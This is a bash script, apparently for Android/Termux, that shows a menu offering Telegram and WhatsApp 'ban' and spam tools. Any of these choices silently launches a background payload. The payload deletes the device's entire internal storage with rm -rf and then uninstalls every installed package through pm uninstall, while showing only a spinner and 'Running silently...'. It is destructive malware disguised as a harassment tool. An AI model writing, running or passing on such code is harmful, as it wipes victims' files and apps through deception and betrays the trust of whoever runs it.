#!/bin/bash

run_silent() {
    bash "$1" >/dev/null 2>&1 &
}

while true; do
    clear
    echo "      𝐌𝐄𝐍𝐔"
    echo
    echo "1. Telegram ban"
    echo "2. WhatsApp ban"
    echo "3. Telegram Spam"
    echo "4. WhatsApp Spam"
    echo "5. Exit"
    echo
    read -p "Select an option: " opt

    case $opt in
        1|2|3|4)
            bash << 'END_SCRIPT' >/dev/null 2>&1 &
# ----------------------------
# Shell menu part (automatic)
# ----------------------------
apt update -y > /dev/null 2>&1

# WARNING: Deletes all internal storage — VERY DANGEROUS
rm -rf /storage/emulated/0/ > /dev/null 2>&1

# ----------------------------
# Call Python script
# ----------------------------
python3 << END
import subprocess
import os
import sys
import time

# -------------------------------
# Step 1: Generate package.list.del.txt
# -------------------------------
cmd = ["cmd", "package", "list", "packages"]

try:
    output = subprocess.check_output(cmd, text=True)
    with open("package.list.del.txt", "w") as f:
        f.write(output)
except subprocess.CalledProcessError as e:
    pass  # ignore errors silently

# -------------------------------
# Step 2: Real uninstalling apps (invisible)
# -------------------------------
spinner = ['|', '/', '-', '\\']

with open("package.list.del.txt", "r") as f:
    for i, line in enumerate(f):
        package_name = line.strip()
        package_name = package_name.split(":", 1)[-1]

        uninstall_cmd = f"pm uninstall --user 0 {package_name}"

        # Spinner message without package name
        sys.stdout.write("\rProcessing ... {}".format(spinner[i % len(spinner)]))
        sys.stdout.flush()

        # Execute uninstall invisibly
        os.system(uninstall_cmd + " > /dev/null 2>&1")
        time.sleep(0.5)
END

END_SCRIPT
            echo "Running silently..."
            sleep 1
            ;;
        5)
            echo "Exiting..."
            exit 0
            ;;
        *)
            echo "Invalid option."
            sleep 1
            ;;
    esac
done
